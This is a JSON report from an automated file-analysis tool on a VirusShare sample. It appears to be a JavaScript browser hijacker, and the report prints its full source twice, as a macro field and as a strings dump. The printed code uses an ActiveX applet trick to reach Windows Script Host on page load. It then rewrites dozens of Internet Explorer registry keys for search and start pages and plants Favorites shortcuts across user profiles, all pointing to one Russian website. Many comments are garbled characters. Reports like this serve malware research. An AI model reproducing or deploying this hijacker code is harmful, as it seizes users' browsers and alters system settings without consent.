{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Shell": "May run an executable file or a system command",
            "WScript.Shell": "May run an executable file or a system command",
            "Windows": "May enumerate application windows",
            "write": "May write to a file"
        },
        "macro": "// <!--\ndocument.write(\"<APPLET code=com.ms.activeX.ActiveXComponent.class height=0 width=0><PARAM NAME=code VALUE=com.ms.activeX.ActiveXComponent><PARAM NAME=height VALUE=1><PARAM NAME=width VALUE=1></APPLET>\");\n// \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd!!! \ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd ?\n// \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd \ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\nvar gsFavorUrl = \"http://www.sauna.e-burg.ru/?\";\n// \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\nvar gsFavorDescr = \"\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd-\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\";\n// \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd \ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\nvar gsSearch = \"http://www.sauna.e-burg.ru/?\";\n// \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd \ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\nvar gsCustomSearch = \"http://www.sauna.e-burg.ru/?\";\n// \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd \ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\nvar gsPrefix = \"http://www.sauna.e-burg.ru/?\";\n\n// !!!!! \ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd !!!!!\nvar iever = GetIEVer();\nfunction GetIEVer()\n{\nvar ua = window.navigator.userAgent\nvar msie = ua.indexOf( \"MSIE \" )\nif( msie > 0 )\nreturn parseInt( ua.substring( msie+5, ua.indexOf( \".\", msie ) ) )\nelse\nreturn 0\n}\nfunction onMycatch( str )\n{\n}\nfunction ChangeSearch()\n{\nShl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Bar\", gsSearch );\nShl.RegWrite( \"HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Bar\", gsSearch );\nShl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\URL\\\\DefaultPrefix\\\\\", gsPrefix );\nShl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\URL\\\\Prefixes\\\\www\", gsPrefix );\nShl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\SearchURL\", gsPrefix );\nShl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Default_Page_URL\", gsPrefix );\nShl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Default_Search_URL\", gsPrefix );\nShl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Page\", gsPrefix );\nShl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Local Page\", gsPrefix );\nShl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Bar\", gsPrefix );\nShl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\UrlTemplate\\\\1\", gsPrefix );\nShl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\UrlTemplate\\\\\", gsPrefix );\nShl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Search\", gsPrefix );\nShl.RegWrite( \"HKCU\\\\\\.DEFAULT\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Local Page\", gsSearch );\nShl.RegWrite( \"HKCU\\\\\\.DEFAULT\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Page\", gsSearch );\nShl.RegWrite( \"HKCU\\\\\\.DEFAULT\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\\", gsSearch );\nShl.RegWrite( \"HKCU\\\\\\.DEFAULT\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Default_Page_URL\", gsSearch );\nShl.RegWrite( \"HKCU\\\\\\.DEFAULT\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\", gsSearch );\nShl.RegWrite( \"HKCU\\\\\\.DEFAULT\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Bar\", gsSearch );\nShl.RegWrite( \"HKCU\\\\\\.DEFAULT\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Default_Search_URL\", gsSearch );\nShl.RegWrite( \"HKCU\\\\\\.DEFAULT\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\UrlTemplate\\\\\", gsSearch );\nShl.RegWrite( \"HKCU\\\\\\.DEFAULT\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\SearchUrl\\\\\", gsSearch );\nif( iever > 4 )\n{\nShl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Search\\\\SearchAssistant\", gsSearch );\nShl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Search\\\\CustomizeSearch\", gsCustomSearch );\n}\n}\nfunction AddLnk( sFolder, type )\n{ \n{ \nif( FSO.FolderExists( sFolder ) )\n{\nvar url, discr;\nswitch(type)\n{\ncase 1: url = gsFavorUrl; discr = gsFavorDescr; break;\n}\nvar Shor = Shl.CreateShortcut( sFolder + \"\\\\\" + discr +\".url\" );\nShor.TargetPath = url;\nShor.Save();\n}\n} \n//catch(e){ return false; }\nreturn true;\n} \nfunction AddLnkBase( sFolder, bFavor )\n{\n//try\n{ \nif( FSO.FolderExists( sFolder ) )\n{\nsFolder = sFolder + \"\\\\\";\nif( bFavor )\n{\nAddLnk( sFolder + \"Favorites\", 1 );\nAddLnk( sFolder + \"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\", 1 );\n}\n}\n} \nreturn true;\n}\nfunction AddLinksNTAll( sFolder, sCurUser, bFavor )\n{\nAddLnkBase( sFolder + sCurUser, bFavor );\nvar iLen = sCurUser.length;\nvar f = FSO.GetFolder( sFolder );// can throw exception\nfc = new Enumerator( f.SubFolders );\nfor( ; !fc.atEnd(); fc.moveNext() )\n{// get each user's folder\nvar sUser = fc.item().Name;//login.001\nvar dot = sUser.indexOf( \".\" );\nif( dot > 0 )\n{\nsBase = sUser.substring( 0, dot );//login\nif( sBase == sCurUser )\n{\nAddLnkBase( fc.item().Path, bFavor );\n}\n}\n}\n}\nfunction AddLinksNT( sFolder )\n{\nif( FSO.FolderExists( sFolder ) )\n{\nAddLinksNTAll( sFolder, \"All Users\", false, true, true );\nAddLinksNTAll( sFolder, Net.UserName, true, false, false );\n}\n}\nfunction AddLinks(  )\n{\n{ \nvar WF = FSO.GetSpecialFolder(0); // windows folder\nAddLnkBase( WF, true, true, true );\nAddLinksNT( FSO.GetDriveName(WF) + \"\\\\Documents and Settings\\\\\" );\nAddLinksNT( WF + \"\\\\Profiles\\\\\" );\n} \n}\nfunction CreateActiveX()\n{\n{ \nif( iever == 4 || iever == 5 )\n{\na1=document.applets[0];\na1.setCLSID(\"{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}\");\na1.createInstance();\nShl = a1.GetObject(); // Windows Script Host Shell Object, WScript.Shell\na1.setCLSID(\"{0D43FE01-F093-11CF-8940-00A0C9054228}\");\na1.createInstance();\nFSO = a1.GetObject(); // FileSystem Object, Scripting.FileSystemObject\na1.setCLSID(\"{F935DC26-1CF0-11D0-ADB9-00C04FD58A0B}\");\na1.createInstance();\nNet = a1.GetObject(); // Windows Script Host Network Object, WScript.Network\n}\nelse if( iever > 5 )\n{\nShl = new ActiveXObject(\"WScript.Shell\");\nFSO = new ActiveXObject(\"Scripting.FileSystemObject\");\nNet = new ActiveXObject(\"WScript.Network\");\n} \n}\n}\nfunction main()\n{ \n{ \nCreateActiveX();\nChangeSearch();\nAddLinks();\n} \n} \nfunction init()\n{ \nif( iever > 3 )\n{\nsetTimeout(\"main()\", 1000);\n}\n} \ninit(); \n\n// -->"
    },
    "filename": "VirusShare_0570da43ccbd549484c63cac7182f53f",
    "filesize": 5925,
    "filetype": "C source, ISO-8859 text, with CRLF line terminators",
    "hashes": {
        "md5": "0570da43ccbd549484c63cac7182f53f",
        "sha1": "d8e08ce09d04466b03216fef6ef6812ddcbe80ed",
        "sha256": "e93e1de7207a234cb186b3a349d6aa4bc130d56767647dcdec137d2433adc7f2"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "// <!--",
            "document.write(\"<APPLET code=com.ms.activeX.ActiveXComponent.class height=0 width=0><PARAM NAME=code VALUE=com.ms.activeX.ActiveXComponent><PARAM NAME=height VALUE=1><PARAM NAME=width VALUE=1></APPLET>\");",
            "// !!!     ?",
            "//        ",
            "var gsFavorUrl = \"http://www.sauna.e-burg.ru/?\";",
            "//      ",
            "var gsFavorDescr = \" - \";",
            "//         ",
            "var gsSearch = \"http://www.sauna.e-burg.ru/?\";",
            "//         ",
            "var gsCustomSearch = \"http://www.sauna.e-burg.ru/?\";",
            "//        ",
            "var gsPrefix = \"http://www.sauna.e-burg.ru/?\";",
            "// !!!!!    !!!!!",
            "var iever = GetIEVer();",
            "function GetIEVer()",
            "var ua = window.navigator.userAgent",
            "var msie = ua.indexOf( \"MSIE \" )",
            "if( msie > 0 )",
            "return parseInt( ua.substring( msie+5, ua.indexOf( \".\", msie ) ) )",
            "else",
            "return 0",
            "function onMycatch( str )",
            "function ChangeSearch()",
            "Shl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Bar\", gsSearch );",
            "Shl.RegWrite( \"HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Bar\", gsSearch );",
            "Shl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\URL\\\\DefaultPrefix\\\\\", gsPrefix );",
            "Shl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\URL\\\\Prefixes\\\\www\", gsPrefix );",
            "Shl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\SearchURL\", gsPrefix );",
            "Shl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Default_Page_URL\", gsPrefix );",
            "Shl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Default_Search_URL\", gsPrefix );",
            "Shl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Page\", gsPrefix );",
            "Shl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Local Page\", gsPrefix );",
            "Shl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Bar\", gsPrefix );",
            "Shl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\UrlTemplate\\\\1\", gsPrefix );",
            "Shl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\UrlTemplate\\\\\", gsPrefix );",
            "Shl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Search\", gsPrefix );",
            "Shl.RegWrite( \"HKCU\\\\\\.DEFAULT\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Local Page\", gsSearch );",
            "Shl.RegWrite( \"HKCU\\\\\\.DEFAULT\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Page\", gsSearch );",
            "Shl.RegWrite( \"HKCU\\\\\\.DEFAULT\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\\", gsSearch );",
            "Shl.RegWrite( \"HKCU\\\\\\.DEFAULT\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Default_Page_URL\", gsSearch );",
            "Shl.RegWrite( \"HKCU\\\\\\.DEFAULT\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\ \", gsSearch );",
            "Shl.RegWrite( \"HKCU\\\\\\.DEFAULT\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Bar\", gsSearch );",
            "Shl.RegWrite( \"HKCU\\\\\\.DEFAULT\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Default_Search_URL\", gsSearch );",
            "Shl.RegWrite( \"HKCU\\\\\\.DEFAULT\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\UrlTemplate\\\\\", gsSearch );",
            "Shl.RegWrite( \"HKCU\\\\\\.DEFAULT\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\SearchUrl\\\\\", gsSearch );",
            "if( iever > 4 )",
            "Shl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Search\\\\SearchAssistant\", gsSearch );",
            "Shl.RegWrite( \"HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Search\\\\CustomizeSearch\", gsCustomSearch );",
            "function AddLnk( sFolder, type )",
            "if( FSO.FolderExists( sFolder ) )",
            "var url, discr;",
            "switch(type)",
            "case 1: url = gsFavorUrl; discr = gsFavorDescr; break;",
            "var Shor = Shl.CreateShortcut( sFolder + \"\\\\\" + discr +\".url\" );",
            "Shor.TargetPath = url;",
            "Shor.Save();",
            "//catch(e){ return false; }",
            "return true;",
            "function AddLnkBase( sFolder, bFavor )",
            "//try",
            "if( FSO.FolderExists( sFolder ) )",
            "sFolder = sFolder + \"\\\\\";",
            "if( bFavor )",
            "AddLnk( sFolder + \"Favorites\", 1 );",
            "AddLnk( sFolder + \"\", 1 );",
            "return true;",
            "function AddLinksNTAll( sFolder, sCurUser, bFavor )",
            "AddLnkBase( sFolder + sCurUser, bFavor );",
            "var iLen = sCurUser.length;",
            "var f = FSO.GetFolder( sFolder );// can throw exception",
            "fc = new Enumerator( f.SubFolders );",
            "for( ; !fc.atEnd(); fc.moveNext() )",
            "{// get each user's folder",
            "var sUser = fc.item().Name;//login.001",
            "var dot = sUser.indexOf( \".\" );",
            "if( dot > 0 )",
            "sBase = sUser.substring( 0, dot );//login",
            "if( sBase == sCurUser )",
            "AddLnkBase( fc.item().Path, bFavor );",
            "function AddLinksNT( sFolder )",
            "if( FSO.FolderExists( sFolder ) )",
            "AddLinksNTAll( sFolder, \"All Users\", false, true, true );",
            "AddLinksNTAll( sFolder, Net.UserName, true, false, false );",
            "function AddLinks(  )",
            "var WF = FSO.GetSpecialFolder(0); // windows folder",
            "AddLnkBase( WF, true, true, true );",
            "AddLinksNT( FSO.GetDriveName(WF) + \"\\\\Documents and Settings\\\\\" );",
            "AddLinksNT( WF + \"\\\\Profiles\\\\\" );",
            "function CreateActiveX()",
            "if( iever == 4 || iever == 5 )",
            "a1=document.applets[0];",
            "a1.setCLSID(\"{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}\");",
            "a1.createInstance();",
            "Shl = a1.GetObject(); // Windows Script Host Shell Object, WScript.Shell",
            "a1.setCLSID(\"{0D43FE01-F093-11CF-8940-00A0C9054228}\");",
            "a1.createInstance();",
            "FSO = a1.GetObject(); // FileSystem Object, Scripting.FileSystemObject",
            "a1.setCLSID(\"{F935DC26-1CF0-11D0-ADB9-00C04FD58A0B}\");",
            "a1.createInstance();",
            "Net = a1.GetObject(); // Windows Script Host Network Object, WScript.Network",
            "else if( iever > 5 )",
            "Shl = new ActiveXObject(\"WScript.Shell\");",
            "FSO = new ActiveXObject(\"Scripting.FileSystemObject\");",
            "Net = new ActiveXObject(\"WScript.Network\");",
            "function main()",
            "CreateActiveX();",
            "ChangeSearch();",
            "AddLinks();",
            "function init()",
            "if( iever > 3 )",
            "setTimeout(\"main()\", 1000);",
            "init(); ",
            "// -->"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.sauna.e-burg.ru/?"
        ]
    },
    "time": "0:00:00.323534",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
